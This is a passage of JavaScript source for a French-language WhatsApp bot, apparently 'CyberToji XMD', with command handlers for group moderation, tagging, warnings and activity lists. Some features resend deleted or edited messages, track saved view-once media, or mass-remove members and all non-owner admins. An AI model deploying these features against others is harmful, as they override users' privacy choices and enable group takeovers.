            antiDelete = true; antiDeleteMode = 'gchat'; saveData();
            await sock.sendMessage(remoteJid, { text: '┃ 🗑️ *ANTI-DELETE : CHAT*\n┃ 👤 *STATUT :* 「 ACTIF 」\n┃ 💬 Messages supprimés renvoyés dans le chat\n┗━━━━━━━━━━━━━━━⊷' });
          } else if (_subAD === 'off') {
            antiDelete = false; saveData();
            await sock.sendMessage(remoteJid, { text: '┃ 🗑️ *ANTI-DELETE*\n┃ 👤 *STATUT :* 「 INACTIF 」\n┗━━━━━━━━━━━━━━━⊷' });
          } else {
            antiDelete = !antiDelete; saveData();
            await sock.sendMessage(remoteJid, { text: `┃ 🗑️ *ANTI-DELETE*\n┃ 👤 *STATUT :* ${antiDelete ? '「 ACTIF 」' : '「 INACTIF 」'}\n┃ 📌 Mode actuel: ${antiDeleteMode}\n┃\n┃ !antidelete private\n┃ !antidelete chat\n┃ !antidelete off\n┗━━━━━━━━━━━━━━━⊷` });
          }
        }
        break;

            case 'antiedit': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '『 ❌ 』 *ACCÈS REFUSÉ*' }); break;
        }
        const _subAE = args[0]?.toLowerCase();
        if (_subAE === 'private') {
          antiEdit = true; antiEditMode = 'private'; saveData();
          await sock.sendMessage(remoteJid, { text: '┃ 📝 *ANTI-EDIT : PRIVÉ*\n┃ 👤 *STATUT :* 「 ACTIF 」\n┃ 📩 Messages modifiés envoyés en PV\n┗━━━━━━━━━━━━━━━⊷' });
        } else if (_subAE === 'chat' || _subAE === 'gchat') {
          antiEdit = true; antiEditMode = 'gchat'; saveData();
          await sock.sendMessage(remoteJid, { text: '┃ 📝 *ANTI-EDIT : CHAT*\n┃ 👤 *STATUT :* 「 ACTIF 」\n┃ 💬 Messages modifiés renvoyés dans le chat\n┗━━━━━━━━━━━━━━━⊷' });
        } else if (_subAE === 'off') {
          antiEdit = false; saveData();
          await sock.sendMessage(remoteJid, { text: '┃ 📝 *ANTI-EDIT*\n┃ 👤 *STATUT :* 「 INACTIF 」\n┗━━━━━━━━━━━━━━━⊷' });
        } else {
          antiEdit = !antiEdit; saveData();
          await sock.sendMessage(remoteJid, { text: `┃ 📝 *ANTI-EDIT*\n┃ 👤 *STATUT :* ${antiEdit ? '「 ACTIF 」' : '「 INACTIF 」'}\n┃ 📌 Mode actuel: ${antiEditMode}\n┃\n┃ !antiedit private\n┃ !antiedit chat\n┃ !antiedit off\n┗━━━━━━━━━━━━━━━⊷` });
        }
        break;
      }

            case 'welcome':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminWelcome = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminWelcome && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsWelcome = getGroupSettings(remoteJid);
        settingsWelcome.welcome = !settingsWelcome.welcome;
        saveData();

        await sock.sendMessage(remoteJid, {
          text: `╔═══════════════════════════════════╗
║    👋 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗦𝗬𝗦𝗧𝗘𝗠      ║
╚═══════════════════════════════════╝

📊 *Statut:* ${settingsWelcome.welcome ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

${settingsWelcome.welcome ? '✅ Les nouveaux membres recevront un message de bienvenue élégant with:\n\n• Nom du groupe\n• Nombre de membres\n• Liste des admins\n• Règles du groupe\n• Date et heure' : '❌ Les nouveaux membres ne recevront plus de message de bienvenue'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🇷🇴 SEIGNEUR TD 🇷🇴`
        });
        break;

      case 'goodbye':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminGoodbye = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGoodbye && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsGoodbye = getGroupSettings(remoteJid);
        settingsGoodbye.goodbye = !settingsGoodbye.goodbye;
        saveData();

        await sock.sendMessage(remoteJid, {
          text: `╔═══════════════════════════════════╗
║    💨 𝗚𝗢𝗢𝗗𝗕𝗬𝗘 𝗦𝗬𝗦𝗧𝗘𝗠      ║
╚═══════════════════════════════════╝

📊 *Statut:* ${settingsGoodbye.goodbye ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

${settingsGoodbye.goodbye ? '✅ Un message d\'au revoir sera envoyé quand quelqu\'un quitte with:\n\n• Nom du groupe\n• Nombre de membres restants\n• Liste des admins\n• Informations utiles\n• Date et heure' : '❌ Plus de message d\'au revoir quand quelqu\'un quitte'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🇷🇴 SEIGNEUR TD 🇷🇴`
        });
        break;

      case 'listactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter l'activité de tous les membres
          const activityList = [];
          for (const participant of participants) {
            const activity = groupActivity.get(participant.id);
            
            if (activity && activity.messageCount > 0) {
              activityList.push({
                jid: participant.id,
                count: activity.messageCount,
                lastMessage: activity.lastMessage
              });
            }
          }
          
          // Trier par nombre de messages (décroissant)
          activityList.sort((a, b) => b.count - a.count);
          
          // Top 3
          const top3 = activityList.slice(0, 3);
          const activeCount = activityList.length;
          
          // Date et heure
          const now = new Date();
          const dateStr = now.toLocaleDateString('fr-FR', {
            timeZone: 'America/NDjamena',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
          });
          const timeStr = now.toLocaleTimeString('fr-FR', {
            timeZone: 'America/NDjamena',
            hour: '2-digit',
            minute: '2-digit'
          });
          
          let listText = `✨ ┏━━━━━━━ 📊 🄻🄸🅂🅃🄴 🄰🄲🅃🄸🅅🄴 ━━━━━━━┓ ✨
🏆 ＴＯＰ ＣＨＡＴＴＥＲＳ ＤＵ ＭＯＭＥＮＴ 🏆\n`;

          if (top3.length > 0) {
            const medals = ['🥇', '🥈', '🥉'];
            const ranks = ['𝟭𝗲𝗿', '𝟮𝗲̀𝗺𝗲', '𝟯𝗲̀𝗺𝗲'];
            const emojis = ['✨', '⚡', '❄️'];
            
            top3.forEach((member, index) => {
              listText += `${emojis[index]} ${medals[index]} ${ranks[index]} : @${member.jid.split('@')[0]}\n`;
              listText += `╰── 💬 ${member.count} 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌\n`;
            });
          } else {
            listText += `⚠️ Aucune activité détectée encore.\n`;
          }
          
          listText += `━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 𝖲𝗍𝖺𝗍𝗂𝗌𝗍𝗂𝗊𝗎𝖾𝗌 𝖦𝗅𝗈𝖻𝖺𝗅𝖾𝗌 :
👥 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 𝖠𝖼𝗍𝗂𝗏𝖾𝗌 : ${activeCount}/${participants.length}
📈 𝖳𝖾𝗇𝖽𝖺𝗇𝖼𝖾 : ${((activeCount / participants.length) * 100).toFixed(1)}%
📅 𝖬𝗂𝗌𝖾 𝖺̀ 𝗃𝗈𝗎𝗋 : ${dateStr} | ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
💠 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖕𝖊𝖉 𝖇𝖞 @${superadmin.split('@')[0]} 💠`;

          const mentions = top3.map(m => m.jid).concat([superadmin]);
          
          await sock.sendMessage(remoteJid, {
            text: listText,
            mentions: mentions
          });
        } catch (error) {
          console.error('Erreur listactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'listinactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const threshold = args[0] ? parseInt(args[0]) : 7; // Par défaut 7 jours
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
          
          const now = Date.now();
          const thresholdMs = threshold * 24 * 60 * 60 * 1000; // Jours en millisecondes
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter les inactifs
          const inactiveList = [];
          for (const participant of participants) {
            const activity = groupActivity.get(participant.id);
            
            if (!activity || (now - activity.lastMessage) > thresholdMs) {
              const daysSinceLastMessage = activity 
                ? Math.floor((now - activity.lastMessage) / (24 * 60 * 60 * 1000))
                : 999; // Jamais parlé
              
              inactiveList.push({
                jid: participant.id,
                days: daysSinceLastMessage
              });
            }
          }
          
          // Trier par inactivité (décroissant)
          inactiveList.sort((a, b) => b.days - a.days);
          
          // Top 3
          const top3 = inactiveList.slice(0, 3);
          const inactiveCount = inactiveList.length;
          
          // Date et heure
          const nowDate = new Date();
          const dateStr = nowDate.toLocaleDateString('fr-FR', {
            timeZone: 'America/NDjamena',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
          });
          const timeStr = nowDate.toLocaleTimeString('fr-FR', {
            timeZone: 'America/NDjamena',
            hour: '2-digit',
            minute: '2-digit'
          });
          
          let listText = `⚠️ ┏━━━━━━━ ⚡ 🅂🄲🄰🄽 🄸🄽🄰🄲🅃🄸🄵 ━━━━━━━┓ ⚠️
🌑 ＭＥＭＢＲＥＳ ＥＮ ＳＯＭＭＥＩＬ 🌑\n`;

          if (top3.length > 0) {
            const ranks = ['𝟭𝗲𝗿', '𝟮𝗲̀𝗺𝗲', '𝟯𝗲̀𝗺𝗲'];
            
            top3.forEach((member, index) => {
              const daysText = member.days >= 999 ? 'Jamais actif' : `${member.days} 𝗃𝗈𝗎𝗋𝗌`;
              listText += `🛑 ${ranks[index]} : @${member.jid.split('@')[0]}\n`;
              listText += `╰── ⏳ 𝖣𝖾𝗋𝗇𝗂𝖾𝗋 𝗆𝗌𝗀 : ${daysText}\n`;
            });
          } else {
            listText += `✅ Tous les membres sont actifs!\n`;
          }
          
          listText += `━━━━━━━━━━━━━━━━━━━━━━━━━━
📉 𝖤́𝗍𝖺𝗍 𝖽𝗎 𝖲𝗒𝗌𝗍𝖾̀𝗆𝖾 :
💤 𝖨𝗇𝖺𝖼𝗍𝗂𝖿𝗌 𝖽𝖾́𝗍𝖾𝖼𝗍𝖾́𝗌 : ${inactiveCount}/${participants.length}
⚙️ 𝖲𝖾𝗎𝗂𝗅 𝖽𝖾 𝗍𝗈𝗅𝖾́𝗋𝖺𝗇𝖼𝖾 : ${threshold} 𝗃𝗈𝗎𝗋𝗌
🚨 𝖠𝗍𝗍𝖾𝗇𝗍𝗂𝗈𝗇 : 𝖫𝖾𝗌 𝗆𝖾𝗆𝖻𝗋𝖾𝗌 𝗂𝗇𝖺𝖼𝗍𝗂𝖿𝗌 𝗋𝗂𝗌𝗊𝗎𝖾𝗇𝗍
𝗎𝗇𝖾 𝖾𝗑𝗉𝗎𝗅𝗌𝗂𝗈𝗇 𝖺𝗎𝗍𝗈𝗆𝖺𝗍𝗂𝗊𝗎𝖾.
📅 ${dateStr} | ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
💠 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖉𝖒𝖎𝖓 : @${superadmin.split('@')[0]} 💠`;

          const mentions = top3.map(m => m.jid).concat([superadmin]);
          
          await sock.sendMessage(remoteJid, {
            text: listText,
            mentions: mentions
          });
        } catch (error) {
          console.error('Erreur listinactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'kickinactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminKickInactive = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminKickInactive && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminKickInactive = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminKickInactive) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin' });
          break;
        }

        try {
          const thresholdDays = args[0] ? parseInt(args[0]) : 7;
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          
          const now = Date.now();
          const thresholdMs = thresholdDays * 24 * 60 * 60 * 1000;
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter les inactifs à expulser
          const toKick = [];
          for (const participant of participants) {
            // Ne pas expulser les admins
            if (participant.admin) continue;
            
            const activity = groupActivity.get(participant.id);
            
            if (!activity || (now - activity.lastMessage) > thresholdMs) {
              toKick.push(participant.id);
            }
          }
          
          if (toKick.length === 0) {
            await sock.sendMessage(remoteJid, {
              text: `✅ Aucun membre inactif détecté (seuil: ${thresholdDays} jours)`
            });
            break;
          }
          
          await sock.sendMessage(remoteJid, {
            text: `⚡ Expulsion des membres inactifs...\n\n🎯 ${toKick.length} membre(s) seront expulsés`
          });
          
          // Expulser par batch de 10
          let kicked = 0;
          for (let i = 0; i < toKick.length; i += 10) {
            const batch = toKick.slice(i, i + 10);
            try {
              await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
              kicked += batch.length;
              await delay(1000);
            } catch (error) {
              console.error('Erreur kicking batch:', error);
            }
          }
          
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║   ⚡ 𝗞𝗜𝗖𝗞 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧  ║
╚═══════════════════════════════════╝

✅ *Expulsions effectuées:* ${kicked}/${toKick.length}
⏰ *Seuil d'inactivité:* ${thresholdDays} jours
📊 *Membres restants:* ${participants.length - kicked}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🇷🇴 SEIGNEUR TD 🇷🇴`
          });
        } catch (error) {
          console.error('Erreur kickinactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'autoreact':
        await handleAutoReactCommand(sock, args, remoteJid, senderJid);
        break;

      case 'tagall':
        await handleTagAll(sock, message, args, remoteJid, isGroup, senderJid);
        break;

      case 'tagadmins':
      case 'tagadmin':
      case 'pingtag': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
          if (admins.length === 0) {
            await sock.sendMessage(remoteJid, { text: '❌ Aucun admin trouvé dans ce groupe.' });
            break;
          }
          const adminJids = admins.map(a => a.id);
          const customMsg = args.join(' ') || '';
          let adminList = '';
          admins.forEach((a, i) => {
            const tag = a.admin === 'superadmin' ? '♛' : '🛡️';
            adminList += `  ${tag} @${a.id.split('@')[0]}\n`;
          });

          await sock.sendMessage(remoteJid, {
            text:
`⌬ ━━━━━ 🛡️ ᴀᴅᴍɪɴ_ʙʀᴏᴀᴅᴄᴀꜱᴛ ━━━━━ ⌬

  ✧⚚✧ ɢʀᴏᴜᴘᴇ : 『 ${metadata.subject} 』
  👥 ᴀᴅᴍɪɴꜱ : ${admins.length}

  ╔⟡───────────────────────────⟡╗
  ⟁ 🛡️ ᴀᴅᴍɪɴ_ʟɪꜱᴛ :
${adminList}  ╚⟡───────────────────────────⟡╝
${customMsg ? `\n  📢 ${customMsg}\n` : ''}
  ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
  🜲 ꜱᴛᴀᴛᴜꜱ : ᴄᴏɴɴᴇᴄᴛᴇᴅ | 🇷🇴 ᴏɴʟɪɴᴇ`,
            mentions: adminJids
          });
          try { await sock.sendMessage(remoteJid, { react: { text: '🛡️', key: message.key } }); } catch(e) {}
        } catch(e) {
          console.error('[tagadmins]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      case 'kickadmins':
      case 'kickadmin':
      case 'removeadmins': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Sèlman owner/admin ki ka fè sa.' });
          break;
        }
        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          // Exclure le bot lui-même et le superadmin (owner du groupe)
          const adminsToKick = metadata.participants.filter(p =>
            (p.admin === 'admin') &&
            p.id !== botJid &&
            !isAdmin(p.id)
          );

          if (adminsToKick.length === 0) {
            await sock.sendMessage(remoteJid, { text: '❌ Aucun admin à expulser.' });
            break;
          }

          await sock.sendMessage(remoteJid, {
            text: `⚙️ Expulsion de ${adminsToKick.length} admin(s) en cours...`
          });

          let kicked = 0;
          for (const admin of adminsToKick) {
            try {
              await sock.groupParticipantsUpdate(remoteJid, [admin.id], 'remove');
              kicked++;
              await delay(800);
            } catch(e) { console.error('[kickadmins] skip:', admin.id, e.message); }
          }

          await sock.sendMessage(remoteJid, {
            text:
`✅ *KickAdmins terminé !*
━━━━━━━━━━━━━━━━━━━━━━━
🛡️ Admins expulsés : ${kicked}/${adminsToKick.length}
━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD 🇷🇴_`
          });
        } catch(e) {
          console.error('[kickadmins]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      case 'hidetag':
      case 'htag':
      case 'invisibletag': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        try {
          const metadata     = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants.map(p => p.id);
          const tagMsg       = args.join(' ') || '';

          await sock.sendMessage(remoteJid, {
            text:     tagMsg || '⁠',
            mentions: participants
          });

          try { await sock.sendMessage(remoteJid, { react: { text: '👻', key: message.key } }); } catch(e) {}
        } catch(e) {
          console.error('[hidetag]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      case 'kickall':
        await handleKickAll(sock, remoteJid, isGroup, senderJid);
        break;

      case 'leave':
        await handleLeave(sock, remoteJid, isGroup, senderJid);
        break;

      case 'status':
        await sock.sendMessage(remoteJid, {
          text: `📊 *Statut du Bot*

🤖 Mode: ${botMode}
⌨️ Typing: ${autoTyping ? 'ON' : 'OFF'}
🎙️ Recording: ${autoRecording ? 'ON' : 'OFF'}
😊 React: ${autoReact ? 'ON' : 'OFF'}
👁️ VV: ${savedViewOnce.get(senderJid)?.length || 0}

👨‍💻 Votre JID:
${senderJid}

🔐 Admin: ${isAdmin(senderJid) ? '✅ OUI' : '❌ NON'}`
        });
        break;

      case 'bible':
        await handleBibleCommand(sock, args, remoteJid);
        break;

      case 'terms':
      case 'termes':
      case 'rules':
        await handleTermsCommand(sock, remoteJid, senderJid);
        break;

      case 'dev':
      case 'developer':
      case 'owner':
      case 'contact':
        await simulateTyping(sock, remoteJid);
        await sendWithImage(sock, remoteJid, 'dev',
`╔═══════════════════════════════════╗
║     👨‍💻 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗜𝗡𝗙𝗢     ║
╚═══════════════════════════════════╝

👑 *SEIGNEUR TD 🇷🇴* 🇷🇴

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 *CONTACT:*
1️⃣  wa.me/23591234568
2️⃣  wa.me/23591234568
3️⃣  wa.me/23591234568

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💼 *SERVICES:*
• Développement de bots WhatsApp
• Scripts personnalisés
• Support technique & consulting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🤖 CyberToji XMD v4.0.0
✨ Made with ❤️ in Tchad 🇹🇩`);
        break;

      case 'checkban':
      case 'checkspam':
      case 'bancheck':
      case 'isbanned':
        await handleCheckBan(sock, args, remoteJid, message, senderJid);
        break;

      // =============================================
      // COMMANDES ANTI
      // =============================================

      case 'antilink':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdmin && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settings = initGroupSettings(remoteJid);
        settings.antilink = !settings.antilink;
        saveData();
        
        await sock.sendMessage(remoteJid, {
          text: `🔗 Anti-Link: ${settings.antilink ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n${settings.antilink ? 'Les liens seront bloqués et les membres avertis.' : 'Les liens sont maintenant autorisés.'}`
        });
        break;

      case 'antibot':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminBot = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminBot && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsBot = initGroupSettings(remoteJid);
        settingsBot.antibot = !settingsBot.antibot;
        saveData();
        
        await sock.sendMessage(remoteJid, {
          text: `🤖 Anti-Bot: ${settingsBot.antibot ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n${settingsBot.antibot ? 'Les bots seront automatiquement expulsés.' : 'Les bots sont maintenant autorisés.'}`
        });
        break;

      case 'antitag':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminTag = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminTag && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsTag = initGroupSettings(remoteJid);
        settingsTag.antitag = !settingsTag.antitag;
        saveData();
        
        await sock.sendMessage(remoteJid, {
          text: `🏷️ Anti-Tag: ${settingsTag.antitag ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n${settingsTag.antitag ? 'Les tags massifs (>5) seront bloqués.' : 'Les tags massifs sont maintenant autorisés.'}`
        });
        break;

      case 'antispam':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminSpam = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminSpam && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsSpam = initGroupSettings(remoteJid);
        settingsSpam.antispam = !settingsSpam.antispam;
        saveData();
        
        await sock.sendMessage(remoteJid, {
          text: `🚫 Anti-Spam: ${settingsSpam.antispam ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n${settingsSpam.antispam ? 'Le spam sera détecté et bloqué automatiquement.' : 'La détection de spam est désactivée.'}`
        });
        break;

      case 'antimentiongroupe':
      case 'antimentiongroup':
      case 'antimentionstatus': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        const isUserAdminAMG = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminAMG && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement.' });
          break;
        }
        const settingsAMG = initGroupSettings(remoteJid);
        settingsAMG.antimentiongroupe = !settingsAMG.antimentiongroupe;
        saveData();
        await sock.sendMessage(remoteJid, {
          text:
`🚫 *Anti-Mention Groupe*
━━━━━━━━━━━━━━━━━━━━━━━
Statut : ${settingsAMG.antimentiongroupe ? '✅ *ACTIVÉ*' : '❌ *DÉSACTIVÉ*'}

${settingsAMG.antimentiongroupe
  ? '⚡ Tout membre qui mentionne ce groupe dans son status WhatsApp sera automatiquement expulsé !'
  : '🔓 La protection contre les mentions de groupe en status est désactivée.'}
━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD 🇷🇴_`
        });
        break;
      }

      case 'warn':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminWarn = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminWarn && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedWarn = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedWarn) {
          await sock.sendMessage(remoteJid, {
            text: `⚠️ *Système d'avertissement*\n\nUtilisation:\n${config.prefix}warn @user raison - Avertir\n${config.prefix}resetwarn @user - Réinitialiser\n${config.prefix}warns @user - Voir les warns`
          });
          break;
        }

        const reason = args.slice(1).join(' ') || 'Aucune raison spécifiée';
        const settingsWarn = initGroupSettings(remoteJid);
        const warnCount = addWarn(remoteJid, mentionedWarn, reason);
        
        await sock.sendMessage(remoteJid, {
          text: `⚠️ @${mentionedWarn.split('@')[0]} a reçu un avertissement!\n\nRaison: ${reason}\nWarnings: ${warnCount}/${settingsWarn.maxWarns}`,
          mentions: [mentionedWarn]
        });

        if (warnCount >= settingsWarn.maxWarns) {
          const botIsAdminWarn = await isBotGroupAdmin(sock, remoteJid);
          if (botIsAdminWarn) {
            await sock.groupParticipantsUpdate(remoteJid, [mentionedWarn], 'remove');
            await sock.sendMessage(remoteJid, {
              text: `❌ @${mentionedWarn.split('@')[0]} a été expulsé (${settingsWarn.maxWarns} warnings)`,
              mentions: [mentionedWarn]
            });
            resetWarns(remoteJid, mentionedWarn);
          }
        }
        break;

      case 'resetwarn':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminReset = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminReset && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedReset = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedReset) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}resetwarn @user`
          });
          break;
        }

        resetWarns(remoteJid, mentionedReset);
        await sock.sendMessage(remoteJid, {
          text: `✅ Warnings réinitialisés pour @${mentionedReset.split('@')[0]}`,
          mentions: [mentionedReset]
        });
        break;

      case 'warns':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const mentionedWarns = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || senderJid;
        const userWarns = getWarns(remoteJid, mentionedWarns);
        const settingsWarns = initGroupSettings(remoteJid);
        
        if (userWarns.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `✅ @${mentionedWarns.split('@')[0]} n'a aucun avertissement`,
            mentions: [mentionedWarns]
          });
        } else {
          let warnText = `⚠️ Warnings de @${mentionedWarns.split('@')[0]}\n\nTotal: ${userWarns.length}/${settingsWarns.maxWarns}\n\n`;
          userWarns.forEach((warn, index) => {
            const date = new Date(warn.timestamp).toLocaleString('fr-FR');
            warnText += `${index + 1}. ${warn.reason}\n   📅 ${date}\n\n`;
          });
          
          await sock.sendMessage(remoteJid, {
            text: warnText,
            mentions: [mentionedWarns]
          });
        }
        break;

      case 'acceptall':
      case 'accept-all':
      case 'acceptrequests':
      case 'approuver': {
        if(!isGroup){await sock.sendMessage(remoteJid,{text:'❌ Groupes seulement.'},{ quoted: message });break;}
        const _isAdminAcc=await isGroupAdmin(sock,remoteJid,senderJid);
        if(!_isAdminAcc&&!isAdminOrOwner()){await sock.sendMessage(remoteJid,{text:'⛔ Admin requis.'},{ quoted: message });break;}
        const _botIsAdminAcc=await isBotGroupAdmin(sock,remoteJid);
        if(!_botIsAdminAcc){await sock.sendMessage(remoteJid,{text:'❌ Le bot doit être admin.'},{ quoted: message });break;}
        try{
          let _pending=[];
          try{_pending=await sock.groupRequestParticipantsList(remoteJid);}catch(e){}
          if(!_pending||!_pending.length){
            const _meta=await sock.groupMetadata(remoteJid);
            const _raw=(_meta.participants||[]).filter(p=>p.pending===true||p.request_method==='invite').map(p=>({jid:p.id}));
            if(_raw.length)_pending=_raw;
          }
          if(!_pending||!_pending.length){await sock.sendMessage(remoteJid,{text:'📭 Aucune demande en attente.'},{ quoted: message });break;}
          await sock.sendMessage(remoteJid,{text:'⏳ Acceptation de '+_pending.length+' demande(s)...'},{ quoted: message });
          const _jids=_pending.map(p=>p.jid);
          let _accepted=0;
          for(let i=0;i<_jids.length;i+=20){
            const _batch=_jids.slice(i,i+20);
            try{await sock.groupRequestParticipantsUpdate(remoteJid,_batch,'approve');_accepted+=_batch.length;if(i+20<_jids.length)await new Promise(r=>setTimeout(r,1200));}catch(e){}
          }
          await sock.sendMessage(remoteJid,{text:'✅ '+_accepted+'/'+_pending.length+' demandes acceptées.'});
        }catch(e){await sock.sendMessage(remoteJid,{text:'❌ Erreur: '+e.message},{ quoted: message });}
        break;
      }

      case 'promote':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminPromote = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminPromote && !isAdminOrOwner()) {
